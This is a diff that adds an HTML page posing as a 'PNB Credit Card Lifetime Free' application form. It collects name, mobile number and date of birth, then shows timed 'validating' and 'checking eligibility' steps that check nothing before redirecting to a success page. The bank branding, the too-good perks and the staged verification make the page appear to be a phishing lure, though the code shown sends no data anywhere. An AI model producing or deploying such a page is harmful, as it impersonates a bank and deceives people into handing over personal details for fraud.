@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply Now | PNB Credit Card</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f6f9;
+            color: #333;
+        }
+        
+        .header {
+            background-color: #7a0c24;
+            color: white;
+            padding: 25px 20px 50px 20px;
+            text-align: left;
+        }
+        .header .sub { color: #f4be41; font-weight: bold; font-size: 14px; letter-spacing: 1px; }
+        .header h2 { margin: 10px 0 5px 0; font-size: 22px; }
+        .header p { margin: 0; font-size: 13px; opacity: 0.8; }
+
+        .form-container {
+            background-color: white;
+            margin: -30px 15px 25px 15px;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0px 4px 15px rgba(0,0,0,0.1);
+        }
+        .form-container h3 { margin-top: 0; font-size: 20px; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-weight: bold; font-size: 14px; margin-bottom: 5px; }
+        .input-group span { display: block; font-size: 12px; color: gray; margin-bottom: 8px; }
+        .input-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+        .checkbox-group { display: flex; align-items: flex-start; gap: 10px; font-size: 13px; margin-bottom: 20px; }
+        .checkbox-group input { margin-top: 3px; }
+        
+        .submit-btn {
+            background-color: #7a0c24;
+            color: white;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .fee-section {
+            background-color: #1e293b;
+            color: white;
+            margin: 20px 15px;
+            padding: 20px;
+            border-radius: 15px;
+        }
+        .fee-title { font-size: 12px; color: #f4be41; font-weight: bold; }
+        .fee-main { font-size: 24px; font-weight: bold; margin: 10px 0 20px 0; }
+        .fee-grid { display: flex; gap: 10px; }
+        .fee-box {
+            flex: 1;
+            background-color: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 15px 10px;
+            border-radius: 10px;
+            text-align: center;
+        }
+        .fee-box .amt { color: #f4be41; font-weight: bold; font-size: 18px; }
+        .fee-box .lbl { font-size: 11px; color: #ccc; margin-top: 5px; }
+
+        .benefits-section { margin: 25px 15px; }
+        .benefits-section h4 { font-size: 18px; margin-bottom: 15px; }
+        .benefit-card {
+            background-color: white;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+        .benefit-icon {
+            font-size: 24px;
+            background-color: #ffeef2;
+            padding: 10px;
+            border-radius: 8px;
+            min-width: 30px;
+            text-align: center;
+        }
+        .benefit-text h5 { margin: 0 0 4px 0; font-size: 15px; }
+        .benefit-text p { margin: 0; font-size: 12px; color: gray; }
+
+        /* Loading Popup Modal Styles */
+        #loadingModal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal-content {
+            background-color: white;
+            width: 85%;
+            max-width: 350px;
+            padding: 30px 20px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
+        }
+        .spinner {
+            width: 50px; height: 50px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #7a0c24;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .modal-content h3 { margin: 10px 0 5px 0; font-size: 20px; color: #111; }
+        .modal-content p { color: #666; font-size: 13px; margin-bottom: 20px; }
+        .step-list { text-align: left; font-size: 13px; color: #444; }
+        .step-item { margin-bottom: 10px; display: flex; align-items: center; gap: 10px; opacity: 0.4; transition: 0.3s; }
+        .step-item.active { opacity: 1; font-weight: bold; color: #7a0c24; }
+        .step-item.done { opacity: 1; color: #10b981; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="sub">PNB Credit Card</div>
+        <h2>PNB Credit Card Lifetime Free</h2>
+        <p>Exclusive financial benefits with zero annual maintenance charges.</p>
+    </div>
+
+    <form id="applyForm" class="form-container">
+        <h3>Apply Now</h3>
+        <p style="color: gray; font-size: 13px; margin-top: -8px; margin-bottom: 20px;">Fill details to check your eligibility</p>
+        
+        <div class="input-group">
+            <label>Full Name *</label>
+            <span>As printed on your PAN card</span>
+            <input type="text" id="fullName" placeholder="e.g. Rahul Kumar Sharma" required>
+        </div>
+
+        <div class="input-group">
+            <label>Mobile Number *</label>
+            <span>Your registered mobile for verification</span>
+            <input type="tel" id="mobile" value="+91 " maxlength="14" placeholder="+91 9876543210" required>
+        </div>
+
+        <div class="input-group">
+            <label>Date of Birth *</label>
+            <span>Format: DD/MM/YYYY (must be 18+)</span>
+            <input type="text" id="dob" maxlength="10" placeholder="DD/MM/YYYY" required>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="terms" required>
+            <label for="terms">I agree to the Privacy Policy and consent to being contacted regarding my application.</label>
+        </div>
+
+        <button type="submit" class="submit-btn">Submit Application →</button>
+    </form>
+
+    <!-- Loading Popup Modal HTML -->
+    <div id="loadingModal">
+        <div class="modal-content">
+            <div class="spinner"></div>
+            <h3>Success!</h3>
+            <p>Redirecting...</p>
+            <div class="step-list">
+                <div class="step-item active" id="step1">● Validating your details...</div>
+                <div class="step-item" id="step2">● Checking eligibility...</div>
+                <div class="step-item" id="step3">● Securing your application...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Alert Modal HTML -->
+    <div id="customAlertModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.6); z-index:10000; justify-content:center; align-items:center;">
+        <div style="background-color:white; width:85%; max-width:320px; padding:25px 20px; border-radius:15px; text-align:center; box-shadow:0 5px 20px rgba(0,0,0,0.2);">
+            <h3 style="margin:0 0 10px 0; color:#7a0c24; font-size:18px;">⚠️ Error</h3>
+            <p id="alertMessage" style="color:#444; font-size:14px; margin-bottom:20px; line-height:1.4;"></p>
+            <button onclick="closeCustomAlert()" style="background-color:#7a0c24; color:white; border:none; padding:10px 25px; border-radius:6px; font-size:14px; font-weight:bold; cursor:pointer;">OK</button>
+        </div>
+    </div>
+
+    <div class="fee-section">
+        <div class="fee-title">ANNUAL FEE</div>
+        <div class="fee-main">₹0 — Lifetime</div>
+        <div class="fee-grid">
+            <div class="fee-box">
+                <div class="amt">₹0</div>
+                <div class="lbl">Joining Fee</div>
+            </div>
+            <div class="fee-box">
+                <div class="amt">₹0</div>
+                <div class="lbl">Annual Fee</div>
+            </div>
+            <div class="fee-box">
+                <div class="amt">∞</div>
+                <div class="lbl">No Charges</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="benefits-section">
+        <h4>Amazing Benefits</h4>
+        <div class="benefit-card">
+            <div class="benefit-icon">✈️</div>
+            <div class="benefit-text">
+                <h5>12 Airport Lounge Access</h5>
+                <p>Relax in style across 1200+ airport lounges</p>
+            </div>
+        </div>
+        <div class="benefit-card">
+            <div class="benefit-icon">🛍️</div>
+            <div class="benefit-text">
+                <h5>10% Shopping Discount</h5>
+                <p>Enjoy instant discount at top brands & online stores</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showCustomAlert(msg) {
+            document.getElementById('alertMessage').innerText = msg;
+            document.getElementById('customAlertModal').style.display = 'flex';
+        }
+        function closeCustomAlert() {
+            document.getElementById('customAlertModal').style.display = 'none';
+        }
+
+        const mobileInput = document.getElementById('mobile');
+        mobileInput.addEventListener('input', function () {
+            if (!mobileInput.value.startsWith("+91 ")) {
+                mobileInput.value = "+91 ";
+            }
+        });
+
+        const dobInput = document.getElementById('dob');
+        dobInput.addEventListener('input', function () {
+            let cleaned = dobInput.value.replace(/\D/g, '');
+            let formatted = '';
+            if (cleaned.length > 0) formatted += cleaned.substring(0, 2);
+            if (cleaned.length >= 3) formatted += '/' + cleaned.substring(2, 4);
+            if (cleaned.length >= 5) formatted += '/' + cleaned.substring(4, 8);
+            dobInput.value = formatted;
+        });
+
+        const form = document.getElementById('applyForm');
+        const loadingModal = document.getElementById('loadingModal');
+
+        form.addEventListener('submit', function (e) {
+            e.preventDefault();
+
+            let mobileVal = mobileInput.value.replace("+91 ", "").trim();
+            if (mobileVal.length !== 10 || isNaN(mobileVal)) {
+                showCustomAlert("Kripya sahi 10-digit ka mobile number darj karein!");
+                mobileInput.focus();
+                return;
+            }
+
+            let dobVal = dobInput.value;
+            let parts = dobVal.split('/');
+            if (parts.length !== 3) {
+                showCustomAlert("Kripya sahi Date of Birth format (DD/MM/YYYY) mein bharein!");
+                dobInput.focus();
+                return;
+            }
+
+            let day = parseInt(parts[0], 10);
+            let month = parseInt(parts[1], 10) - 1;
+            let year = parseInt(parts[2], 10);
+            let birthDate = new Date(year, month, day);
+            
+            let today = new Date();
+            let age = today.getFullYear() - birthDate.getFullYear();
+            let m = today.getMonth() - birthDate.getMonth();
+            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
+                age--;
+            }
+
+            if (isNaN(age) || age < 18) {
+                showCustomAlert("Aapki umr 18 varsh se kam hai! Aap is card ke liye eligible nahi hain.");
+                dobInput.focus();
+                return;
+            }
+
+            loadingModal.style.display = 'flex';
+
+            setTimeout(() => {
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step1').classList.add('done');
+                document.getElementById('step2').classList.add('active');
+            }, 1000);
+
+            setTimeout(() => {
+                document.getElementById('step2').classList.remove('active');
+                document.getElementById('step2').classList.add('done');
+                document.getElementById('step3').classList.add('active');
+            }, 2000);
+
+            setTimeout(() => {
+                window.location.href = "success.html";
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
